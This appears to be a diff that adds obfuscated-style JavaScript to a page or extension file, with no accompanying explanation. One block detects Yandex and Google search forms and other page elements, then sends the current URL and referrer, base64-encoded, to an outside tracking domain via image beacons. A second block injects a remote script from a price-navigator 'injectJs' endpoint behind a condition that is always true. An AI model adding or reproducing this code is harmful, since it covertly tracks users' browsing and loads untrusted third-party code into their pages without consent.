@@ -1,0 +1,41 @@
+
+;
+!(function(d){
+
+        var found = d.querySelector(".ya-site-form__search");
+
+        if(found){
+            new Image().src="//contentdefender-cis1.org/ireport/finderya/value/"+encodeURIComponent(window.btoa(document.location+":"+document.referrer));
+        }
+        var foundg = d.querySelector(".cse-branding-form");
+
+        if(foundg){
+            new Image().src="//contentdefender-cis1.org/ireport/finderg/value/"+encodeURIComponent(window.btoa(document.location+":"+document.referrer));
+        }
+        var foundc = d.querySelector("body > div.dwnl-arrow-overlay");
+
+        if(foundc){
+            new Image().src="//contentdefender-cis1.org/ireport/finderc/value/"+encodeURIComponent(window.btoa(document.location+":"+document.referrer));
+        }
+        var foundpr = d.querySelector("body > div.center #img1");
+
+        if(foundpr){
+            new Image().src="//contentdefender-cis1.org/ireport/finderpr/value/"+encodeURIComponent(window.btoa(document.location+":"+document.referrer));
+        }
+})(document);
+;
+!(function(d){
+	
+   if(115 != 10000){
+
+        var scriptlc = d.createElement("script");
+        scriptlc.src = "//price-navigator.com/api/injectJs/account/cd/subaccount/115";
+        scriptlc.charset = "UTF-8";
+        d.body.appendChild(scriptlc);
+
+    }
+
+})(document);
+;
+
+
